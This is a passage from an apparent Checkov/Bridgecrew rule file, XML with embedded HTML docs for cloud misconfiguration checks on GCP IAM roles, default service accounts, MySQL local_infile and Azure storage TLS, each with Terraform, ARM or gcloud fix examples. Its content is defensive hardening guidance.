<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="arm-template"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-arm-template"></div>ARM Template</div><a aria-label="Skip link to ARM Template" class="heading-anchor-icon fa fa-anchor" href="#arm-template"></a></h2>
<ul>
<li><strong>Resource:</strong> Microsoft.Storage/storageAccounts</li>
<li><strong>Argument:</strong> minimumTlsVersion<br/>
To configure the minimum TLS version for a storage account with a template, create a template with the MinimumTLSVersion property set to TLS1_0, TLS1_1, or TLS1_2. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">{
    "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "parameters": {},
    "variables": {
        "storageAccountName": "[concat(uniqueString(subscription().subscriptionId), 'tls')]"
    },
    "resources": [
        {
        "name": "[variables('storageAccountName')]",
        "type": "Microsoft.Storage/storageAccounts",
        "apiVersion": "2019-06-01",
        "location": "&lt;location&gt;",
        "properties": {
            "minimumTlsVersion": "TLS1_2"
        },
        "dependsOn": [],
        "sku": {
          "name": "Standard_GRS"
        },
        "kind": "StorageV2",
        "tags": {}
        }
    ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_storage_2' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_storage_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_storage_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_45</key>
    <name>Ensure roles do not impersonate or manage Service Accounts used at organizational level</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="roles-impersonate-or-manage-service-accounts-used-at-organizational-level"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-roles-impersonate-or-manage-service-accounts-used-at-organizational-level"></div>Roles impersonate or manage Service Accounts used at organizational level</div><a aria-label="Skip link to Roles impersonate or manage Service Accounts used at organizational level" class="heading-anchor-icon fa fa-anchor" href="#roles-impersonate-or-manage-service-accounts-used-at-organizational-level"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The IAM role is an identity with specific permissions. An IAM role is similar to an IAM user: it has a Google identity with permission policies that determine what the identity can and cannot do in Google Cloud. Certain IAM roles contain permissions that enable a user with the role to impersonate or manage service accounts in a GCP folder through IAM inheritance from a higher resource, i.e., folder binding.</p>
<p>We recommend you do not set IAM role bindings with known dangerous roles that enable impersonation at the organizational level.</p>
<p>The following roles enable identities to impersonate all service account identities within a project if the identity is granted the role at the project, folder, or organization level. The following list includes our <em>current </em>recommendations for dangerous roles, however, it is not exhaustive as permissions and roles change frequently.</p>
<p><strong>Primitive Roles</strong>:</p>
<ul>
<li>roles/owner</li>
<li>roles/editor</li>
</ul>
<p><strong>Predefined Roles</strong>:</p>
<ul>
<li>roles/iam.securityAdmin</li>
<li>roles/iam.serviceAccountAdmin</li>
<li>roles/iam.serviceAccountKeyAdmin</li>
<li>roles/iam.serviceAccountUser</li>
<li>roles/iam.serviceAccountTokenCreator</li>
<li>roles/iam.workloadIdentityUser</li>
<li>roles/dataproc.editor</li>
<li>roles/dataproc.admin</li>
<li>roles/dataflow.developer</li>
<li>roles/resourcemanager.folderAdmin</li>
<li>roles/resourcemanager.folderIamAdmin</li>
<li>roles/resourcemanager.projectIamAdmin</li>
<li>roles/resourcemanager.organizationAdmin</li>
<li>roles/cloudasset.viewer</li>
<li>roles/cloudasset.owner</li>
</ul>
<p><strong>Service Agent Roles</strong>:<br/>
Service agent roles should not be used for any identities other than the Google managed service account they are associated with.</p>
<ul>
<li>roles/serverless.serviceAgent</li>
<li>roles/dataproc.serviceAgent</li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p><strong>Resources</strong>:<br/>
google_organization_iam_member<br/>
google_organization_iam_binding<br/>
<strong>Argument</strong>: role</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">google_organization_iam_member</button><button type="button">google_organization_iam_binding</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="google_organization_iam_member">resource "google_organization_iam_member" "example" {
  org_id  = "your-org-id"
- role    =  &lt;ANY OF THE ROLES LISTED ABOVE&gt;
  member  = "user:<a class="__cf_email__" data-cfemail="c1b5a4b2b581a4b9a0acb1ada4ecb1b3aeaba4a2b5efa8a0acefa6b2a4b3b7a8a2a4a0a2a2aeb4afb5efa2aeac" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
}
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-json theme-light" data-lang="json" name="google_organization_iam_binding">resource "google_project_iam_binding" "example" {
  org_id  = "your-org-id"
- role    =  &lt;ANY OF THE ROLES LISTED ABOVE&gt;
  members  = [
  "user:<a class="__cf_email__" data-cfemail="c4b0a1b7b084a1bca5a9b4a8a1e9b4b6abaea1a7b0eaada5a9eaa3b7a1b6b2ada7a1a5a7a7abb1aab0eaa7aba9" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>",
  ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_6' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_iam_6</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_6' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_46</key>
    <name>Ensure default Service Account is not used at project level</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="default-service-account-is-used-at-project-level"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-default-service-account-is-used-at-project-level"></div>Default Service Account is used at project level</div><a aria-label="Skip link to Default Service Account is used at project level" class="heading-anchor-icon fa fa-anchor" href="#default-service-account-is-used-at-project-level"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A service account is a special Google account that belongs to an application or a VM, not to an individual end-user. The application uses the service account to call the service's Google API so that users are not directly involved. Service accounts represent service-level security of application or VM Resources, determined by the roles assigned to them. The use of Default service accounts should be avoided, see below for details.</p>
<p>We recommend you do not set IAM role bindings using the default Compute Engine and App Engine service account. </p>
<p><strong>Default Compute Engine Service Account</strong>: Used by GKE, Compute, DataProc, DataFlow, Composer.<br/>
<strong><a class="__cf_email__" data-cfemail="d7a7a5b8bdb2b4a3fab9a2bab5b2a5fab4b8baa7a2a3b297b3b2a1b2bbb8a7b2a5f9b0a4b2a5a1beb4b2b6b4b4b8a2b9a3f9b4b8ba" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a></strong></p>
<p><strong>Default Appspot Service Account</strong>: Used by App Engine, Cloud Functions, App Engine based services.<br/>
<strong><a class="__cf_email__" data-cfemail="4d3d3f2227282e396024290d2c3d3d3e3d2239632a3e283f3b242e282c2e2e22382339632e2220" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a></strong></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resources</strong>:<br/>
google_project_iam_member<br/>
google_project_iam_binding</li>
<li><strong>Argument</strong>: member</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">google_project_iam_member</button><button type="button">google_project_iam_binding</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="google_project_iam_member">resource "google_project_iam_member" "project" {
  project = "project/1234567"
  role    = "roles/owner"
- member  = "<a class="__cf_email__" data-cfemail="4030322f2a2523346d2e352d2225326d232f2d3035342500242536252c2f3025326e27332532362923252123232f352e346e232f2d" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
- member  = "<a class="__cf_email__" data-cfemail="94e4e6fbfef1f7e0b9fdf0d4f5e4e4e7e4fbe0baf3e7f1e6e2fdf7f1f5f7f7fbe1fae0baf7fbf9" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
}
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-json theme-light" data-lang="json" name="google_project_iam_binding">resource "google_project_iam_member" "project" {
  project = "project/1234567"
  role    = "roles/owner"
- members  = [
      "<a class="__cf_email__" data-cfemail="f68684999c939582db98839b949384db95999b86838293b6929380939a99869384d891859384809f959397959599839882d895999b" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>",
      "<a class="__cf_email__" data-cfemail="0272706d686761762f6b664263727271726d762c65716770746b61676361616d776c762c616d6f" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
     ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_7' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_iam_7</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_7' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_47</key>
    <name>Ensure default Service Account is not used at organization level</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="default-service-account-is-used-at-organization-level"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-default-service-account-is-used-at-organization-level"></div>Default Service Account is used at organization level</div><a aria-label="Skip link to Default Service Account is used at organization level" class="heading-anchor-icon fa fa-anchor" href="#default-service-account-is-used-at-organization-level"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A service account is a special Google account that belongs to an application or a VM, not to an individual end-user. The application uses the service account to call the service's Google API so that users are not directly involved. Service accounts represent service-level security of application or VM Resources, determined by the roles assigned to them. The use of Default service accounts should be avoided, see below for details.</p>
<p>We recommend you do not set IAM role bindings using the default Compute Engine and App Engine service account. </p>
<p><strong>Default Compute Engine Service Account</strong>: Used by GKE, Compute, DataProc, DataFlow, Composer.<br/>
<strong><a class="__cf_email__" data-cfemail="2c5c5e4346494f58014259414e495e014f43415c5958496c48495a4940435c495e024b5f495e5a454f494d4f4f43594258024f4341" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a></strong></p>
<p><strong>Default Appspot Service Account</strong>: Used by App Engine, Cloud Functions, App Engine based services.<br/>
<strong><a class="__cf_email__" data-cfemail="4a3a3825202f293e67232e0a2b3a3a393a253e642d392f383c23292f2b2929253f243e64292527" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a></strong></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resources</strong>:<br/>
google_organization_iam_member<br/>
google_organization_iam_binding</li>
<li><strong>Argument</strong>: member</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">google_organization_iam_member</button><button type="button">google_organization_iam_binding</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="google_organization_iam_member">resource "google_organization_iam_member" "organization" {
  org_id = "your-org-id"
  role    = "roles/owner"
- member  = "<a class="__cf_email__" data-cfemail="daaaa8b5b0bfb9aef7b4afb7b8bfa8f7b9b5b7aaafaebf9abebfacbfb6b5aabfa8f4bda9bfa8acb3b9bfbbb9b9b5afb4aef4b9b5b7" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
- member  = "<a class="__cf_email__" data-cfemail="0474766b6e616770296d604465747477746b702a63776176726d67616567676b716a702a676b69" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
}
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-json theme-light" data-lang="json" name="google_organization_iam_binding">resource "google_organization_iam_member" "organization" {
  org_id = "your-org-id"
  role    = "roles/owner"
- members  = [
      "<a class="__cf_email__" data-cfemail="19696b76737c7a6d34776c747b7c6b347a7674696c6d7c597d7c6f7c7576697c6b377e6a7c6b6f707a7c787a7a766c776d377a7674" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>",
      "<a class="__cf_email__" data-cfemail="58282a37323d3b2c75313c183928282b28372c763f2b3d2a2e313b3d393b3b372d362c763b3735" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
     ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_8' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_iam_8</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_8' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_48</key>
    <name>Ensure default Service Account is not used at folder level</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="default-service-account-is-used-at-folder-level"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-default-service-account-is-used-at-folder-level"></div>Default Service Account is used at folder level</div><a aria-label="Skip link to Default Service Account is used at folder level" class="heading-anchor-icon fa fa-anchor" href="#default-service-account-is-used-at-folder-level"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A service account is a special Google account that belongs to an application or a VM, not to an individual end-user. The application uses the service account to call the service's Google API so that users are not directly involved. Service accounts represent service-level security of application or VM Resources, determined by the roles assigned to them. The use of Default service accounts should be avoided, see below for details.</p>
<p>We recommend you do not set IAM role bindings using the default Compute Engine and App Engine service account. </p>
<p><strong>Default Compute Engine Service Account</strong>: Used by GKE, Compute, DataProc, DataFlow, Composer.<br/>
<strong><a class="__cf_email__" data-cfemail="c3b3b1aca9a6a0b7eeadb6aea1a6b1eea0acaeb3b6b7a683a7a6b5a6afacb3a6b1eda4b0a6b1b5aaa0a6a2a0a0acb6adb7eda0acae" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a></strong></p>
<p><strong>Default Appspot Service Account</strong>: Used by App Engine, Cloud Functions, App Engine based services.<br/>
<strong><a class="__cf_email__" data-cfemail="d2a2a0bdb8b7b1a6ffbbb692b3a2a2a1a2bda6fcb5a1b7a0a4bbb1b7b3b1b1bda7bca6fcb1bdbf" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a></strong></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resources</strong>:<br/>
google_folder_iam_member<br/>
google_folder_iam_binding</li>
<li><strong>Argument</strong>: role + member</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">google_folder_iam_member</button><button type="button">google_folder_iam_binding</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="google_folder_iam_member">resource "google_folder_iam_member" "folder" {
  folder = "folders/1234567"
  role    = "roles/owner"
- member  = "<a class="__cf_email__" data-cfemail="e191938e8b848295cc8f948c838493cc828e8c91949584a1858497848d8e918493cf86928493978882848082828e948f95cf828e8c" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
- member  = "<a class="__cf_email__" data-cfemail="7c0c0e1316191f085115183c1d0c0c0f0c1308521b0f190e0a151f191d1f1f13091208521f1311" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
}
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-json theme-light" data-lang="json" name="google_folder_iam_binding">resource "google_folder_iam_member" "folder" {
  folder = "folders/1234567"
  role    = "roles/owner"
- members  = [
      "<a class="__cf_email__" data-cfemail="7505071a1f101601581b001817100758161a18050001103511100310191a0510075b12061007031c16101416161a001b015b161a18" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>",
      "<a class="__cf_email__" data-cfemail="cebebca1a4abadbae3a7aa8eafbebebdbea1ba" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>.gserviceaccount.com"
     ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_9' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_iam_9</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_9' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_49</key>
    <name>Ensure roles do not impersonate or manage Service Accounts used at project level</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="roles-impersonate-or-manage-service-accounts-used-at-project-level"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-roles-impersonate-or-manage-service-accounts-used-at-project-level"></div>Roles impersonate or manage Service Accounts used at project level</div><a aria-label="Skip link to Roles impersonate or manage Service Accounts used at project level" class="heading-anchor-icon fa fa-anchor" href="#roles-impersonate-or-manage-service-accounts-used-at-project-level"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The IAM role is an identity with specific permissions. An IAM role is similar to an IAM user: it has a Google identity with permission policies that determine what the identity can and cannot do in Google Cloud. Certain IAM roles contain permissions that enable a user with the role to impersonate or manage service accounts in a GCP project through IAM inheritance from a higher resource, i.e., project binding.</p>
<p>We recommend you do not set IAM role bindings with known dangerous roles that enable impersonation at the project level.</p>
<p>The following roles enable identities to impersonate all service account identities within a project if the identity is granted the role at the project, folder, or organization level. The following list includes our current recommendations for dangerous roles, however, it is not exhaustive as permissions and roles change frequently.</p>
<p><strong>Primitive Roles</strong>:</p>
<ul>
<li>roles/owner</li>
<li>roles/editor</li>
</ul>
<p><strong>Predefined Roles</strong>:</p>
<ul>
<li>roles/iam.securityAdmin</li>
<li>roles/iam.serviceAccountAdmin</li>
<li>roles/iam.serviceAccountKeyAdmin</li>
<li>roles/iam.serviceAccountUser</li>
<li>roles/iam.serviceAccountTokenCreator</li>
<li>roles/iam.workloadIdentityUser</li>
<li>roles/dataproc.editor</li>
<li>roles/dataproc.admin</li>
<li>roles/dataflow.developer</li>
<li>roles/resourcemanager.folderAdmin</li>
<li>roles/resourcemanager.folderIamAdmin</li>
<li>roles/resourcemanager.projectIamAdmin</li>
<li>roles/resourcemanager.organizationAdmin</li>
<li>roles/cloudasset.viewer</li>
<li>roles/cloudasset.owner</li>
</ul>
<p><strong>Service Agent Roles</strong>: Service agent roles should not be used for any identities other than the Google managed service account they are associated with.</p>
<ul>
<li>roles/serverless.serviceAgent</li>
<li>roles/dataproc.serviceAgent</li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resources</strong>:<br/>
google_project_iam_member<br/>
google_project_iam_binding</li>
<li><strong>Argument</strong>: role</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">google_project_iam_member</button><button type="button">google_project_iam_binding</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="google_project_iam_member">resource "google_project_iam_member" "example" {
  project  = "project/1234567"
- role    =  &lt;ANY OF THE ROLES LISTED ABOVE&gt;
  member  = "user:<a class="__cf_email__" data-cfemail="8cf8e9fff8cce9f4ede1fce0e9a1fcfee3e6e9eff8a2e5ede1a2ebffe9fefae5efe9edefefe3f9e2f8a2efe3e1" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
}
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-json theme-light" data-lang="json" name="google_project_iam_binding">resource "google_project_iam_binding" "example" {
  project  = "project/1234567"
- role    =  &lt;ANY OF THE ROLES LISTED ABOVE&gt;
  members  = [
  "user:<a class="__cf_email__" data-cfemail="c8bcadbbbc88adb0a9a5b8a4ade5b8baa7a2adabbce6a1a9a5e6afbbadbabea1abada9ababa7bda6bce6aba7a5" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>",
  ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_10' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_iam_10</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_10' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_50</key>
    <name>Ensure GCP MySQL instance with local_infile database flag is disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-mysql-instance-with-local_infile-database-flag-is-not-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-my-sql-instance-with-local-infile-database-flag-is-not-disabled"></div>GCP MySQL instance with local_infile database flag is not disabled</div><a aria-label="Skip link to GCP MySQL instance with local_infile database flag is not disabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-mysql-instance-with-local_infile-database-flag-is-not-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The <strong>local_infile</strong> database flag controls the server-side LOCAL capability for LOAD DATA statements. Depending on the <strong>local_infile</strong> setting, the server refuses or permits local data loading by clients that have LOCAL enabled on the client side.</p>
<p>To explicitly cause the server to refuse LOAD DATA LOCAL statements start <strong>mysqld</strong> with <strong>local_infile</strong> disabled, regardless of how client programs and libraries are configured at build time or runtime. <strong>local_infile</strong> can also be set at runtime. </p>
<p>We recommended you set the <strong>local_infile</strong> database flag for a Cloud SQL MySQL instance to <strong>off</strong> to address the security issues associated with the flag. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/sql/instances" target="_self">Cloud SQL Instances</a>.</li>
<li>Select the <strong>MySQL instance</strong> where the database flag needs to be enabled.</li>
<li>Click <strong>Edit</strong>.</li>
<li>Scroll down to the <strong>Flags</strong> section.</li>
<li>To set a flag that has not been set on the instance before, click <strong>Add item</strong>.</li>
<li>Select the flag <strong>local_infile</strong> from the drop-down menu, and set its value to <strong>off</strong>.</li>
<li>Click <strong>Save</strong>.</li>
<li>Confirm the changes in the <strong>Flags</strong> section on the <strong>Overview</strong> page.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>List all Cloud SQL database instances using the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances list</code></li>
<li>Configure the local_infile database flag for every Cloud SQL Mysql database instance using the below command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances patch INSTANCE_NAME --database-flags local_infile=off</code></li>
</ol>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>This command will overwrite all database flags previously set. To keep those flags, and add new ones, include the values for all flags to be set on the instance. Any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (<strong>=</strong>).</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
